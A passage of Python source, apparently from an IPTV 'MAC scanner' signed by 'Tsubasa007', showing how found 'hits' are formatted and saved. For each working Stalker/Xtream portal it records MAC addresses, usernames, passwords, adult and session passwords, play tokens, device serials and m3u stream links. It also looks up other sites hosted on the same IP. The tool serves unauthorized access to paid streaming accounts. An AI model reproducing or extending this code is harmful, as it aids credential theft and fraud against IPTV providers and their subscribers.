			   		       if veri.count("Site info ")>0:
			   		             for i in veri.split('Site info ('):
			   		              yan=yan+(i.split(')')[0])+" 🌎 "
			   		              yanpanel=(yan.split('(')[1])
			   		
			   	#else:
	            	if not realm==panel:
	            		pal=realm.split(':')[0]
	            		url= "http://ipv4info.com/?act=check&ip="+pal
	            		res = ses.get(url, timeout=15, verify=False)
	            		veri=str(res.text)
	            		yan=""
	            		yanpanel1="hata"
	            		if veri.count("Site info ")>0:
	            		   for i in veri.split('Site info ('):
	            		   	if yanpanel.count(i.split(')')[0])==0:
	            		   		yan=yan+(i.split(')')[0])+" 🌎 "
	            		   		yanpanel1=(yan.split('(')[1])
	            		else:
	            			yan1=veri.split('href="/ip-address')[1]
	            			yan1=yan1.split('">')[0]
	            			url="http://ipv4info.com/ip-address"+yan1
	            			res = ses.get(url, timeout=15, verify=False)
	            			veri=str(res.text)
	            			if veri.count("Site info ")>0:
			   		         for i in veri.split('Site info ('):
			   		          	  if yanpanel.count(i.split(')')[0])==0:
			   		          	   	yan=yan+(i.split(')')[0])+" 🌎 "
			   		          	   	yanpanel1=(yan.split('(')[1])
			   		
	            	if not yanpanel1=="hata" :
	            		yanpanel=yanpanel+yanpanel1
	            	yanpanel=yanpanel.replace(" 🌎  🌎 "," 🌎 ")
            	except:pass
            		
            	
            	mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
            	imzaa=""
            	imzab=""
            	imzak=""
            	if not fname=="":
            		panell=panel+'/stalker_portal'
            	else:
            		panell=panel
            	imza1=("""
╔ ᴘʏᴛʜᴏɴ ᴍᴏʙɪʟᴅᴇɴ ᴛᴀʀᴀᴍᴀ ╗
╠•●۞🌐𝕻𝖆𝖓𝖊𝖑➤http://"""+panell+"""/c/
╠•●۞🌍𝕽𝖊𝖆𝖑➤http://"""+real+"""
╠•●۞💎𝕸𝖆𝖈➤ """+mac+"""
╠•●۞📆𝕰𝖝𝖕.➤ """+trh+"""
╠➤ 𝗛𝗶𝘁𝘀 ʙʏ Tsubasa007  """)
            	if not adult =="":
            		imzaa=("""
╠•●۞👤ᴀᴄɴ.ɪᴅ➤"""+acount_id+"""
╠•●۞👤ꜱᴛʙ ɪᴅ➤"""+stb_id+"""
╠•●۞📺ꜱᴛʙᴛɪᴘɪ➤"""+stb_type+"""
╠•●۞🎦ᴄʟɪᴇɴᴛᴛɪᴘɪ➤"""+stb_c+"""
╠•●۞🔞ᴀ.ᴘᴀꜱꜱ➤"""+adult+"""
╠•●۞⚙️ꜱ.ᴘᴀꜱꜱ➤"""+sespas+"""
╠•●۞🎲ᴘʟᴀʏᴛᴏᴋᴇɴ➤"""+play_token+"""
╠•●۞🌍ɪᴘ➤"""+ip+"""
╠•●۞🕛ᴛɪᴍᴇᴢᴏɴᴇ➤"""+timezon.replace('\/','/')+"""
╠•●۞🌏ʟᴏᴄᴀʟ➤"""+tloca+"""
╠🅑🅛🅤🅔-🅦🅗🅘🅣🅔 ═""")
            		if not fname=="":
            			imzaa=("""
╠•●۞👩‍User ➤"""+user+"""
╠•●۞🔑Pass ➤"""+passw+"""
╠•●۞👤Stb Id➤"""+stb_id+"""
╠•●۞👤Stb Type➤"""+stb_type+"""
╠•●۞👤INFO➤"""+fname+"""
╠•●۞🔞A.Pass➤"""+adult+"""
╠•●۞⚙️S.Pass➤"""+sespas+"""
╠•●۞📊PlanID➤"""+tplan+"""
╠•●۞🎦TrarrifPlan➤"""+tarrif+"""
╠•●۞⏱Time Zone➤"""+timezon.replace('\/','/')+"""
╠•●۞🌍Ip➤"""+ip+"""
╠➤ 𝗛𝗶𝘁𝘀 ʙʏ Tsubasa007  """)
            			
            			
            			
	   #except:pass
            	imza2=""
            	if not acon=="":
            		imza2=("""
╠•●۞🌐 Host ➤http://"""+portal+"""/c/
╠•●۞🌍 Real ➤http://"""+realm+"""
╠•●۞📡 Port ➤ """+port+"""
╠•●۞👩‍ User ➤ """+user+"""
╠•●۞🔑 Pass ➤ """+passw+"""
╠•●۞📆 Exp. ➤ """+bitis+""" 
╠•●۞👩 Act Con ➤ """+acon+"""
╠•●۞👪 Max Con ➤ """+mcon+""" 
╠•●۞🌐 Status ➤ """+status+"""
╠•●۞⏰ TimeZone➤ """+timezone+"""
╠➤ 𝗛𝗶𝘁𝘀 ʙʏ Tsubasa007  
╠•●۞🎬𝗖𝗼𝘂𝗻𝘁𝗿𝗶𝗲𝘀𝗖𝗼𝘂𝗻𝘁➤"""+kanalsayisi+"""
╠•●۞🎬𝗩𝗼𝗱𝗖𝗼𝘂𝗻𝘁➤"""+filmsayisi+"""
╠•●۞🎬𝗦𝗲𝗿𝗶𝗖𝗼𝘂𝗻𝘁➤"""+dizisayisi+"""
╠➤ 𝗛𝗶𝘁𝘀 ʙʏ Tsubasa007   ╠""")
            	imzasif=("""
╠•●۞🔑𝗦𝗲𝗿𝗶𝗮𝗹➤"""+SNENC+""" 
╠•●۞🔑𝗦𝗲𝗿𝗶𝗮𝗹𝗖𝘂𝘁➤"""+SNCUT+"""
╠•●۞🔑𝗗𝗲𝘃𝗶𝗰𝗲𝗜𝗗_𝟭➤"""+DEVENC+"""
╠•●۞🔑𝗗𝗲𝘃𝗶𝗰𝗲𝗜𝗗_𝟮➤"""+SINGENC+"""
╠➤ 𝗛𝗶𝘁𝘀 ʙʏ Tsubasa007  """)
            	imza3=("""
╠•●۞🔗𝖒3𝖚_𝖀𝖗𝖑 ➤"""+mlink+"""
╠═ ᴘʏᴛʜᴏɴ 🅑-🅦 ᴘʏ ᴄᴏɴғɪɢ╠""")
            	#print(yanpanel)
            	if not yanpanel=="hata":
            		imzayan=("""
╠•●۞🌐 🅨🅐🅝🅟🅐🅝🅔🅛🅛🅔🅡 ➤ """+yanpanel.replace(" 🌎","\n╠•●۞🌎")+"""Tsubasa007""")
            	if kanalkata=="1" or kanalkata =="2":
            		imzab=("""
╠•●۞ ➤ 𝗛𝗶𝘁𝘀 ʙʏ Tsubasa007  
╠•●۞ 💫  🆄🅻🅺🅴  ➤ 📽           		
╠•●۞"""+kategori+""" """)
#⚡️✨💫
            	if kanalkata =="2":
            		imzak=("""
╠•●۞ ✨  🆅🅾🅳 ➤ 📽 
╠•●۞"""+kategoriv+"""
╠•●۞ ⚡️ 🆂🅴🆁🅸 ➤ 📽 
╠•●۞"""+kategoris+""" """)
            	imzas=("""
╚═ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ Tsubasa007══╝""")
            	imza=imza1+imzaa+imza2+imzasif+imzayan+imza3+imzab+imzak+imzas
            	yaz(imza+'\n'+'\n')
            	print(imza)
            	#print("********")
	##except:pass
	   
	if not ozelmac=="":
		quit()
	

	

	
	
